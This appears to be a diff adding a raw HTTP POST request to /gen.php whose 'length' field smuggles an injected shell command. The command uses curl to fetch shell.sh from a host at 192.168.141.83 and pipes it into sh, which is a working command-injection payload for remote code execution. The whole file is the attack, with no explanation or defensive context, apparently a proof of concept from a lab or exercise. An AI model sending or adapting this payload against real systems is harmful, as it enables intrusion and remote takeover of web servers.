@@ -1,0 +1,6 @@
+POST /gen.php HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 56
+
+length=8;sh -c "$(curl -s 192.168.141.83:8000/shell.sh)"
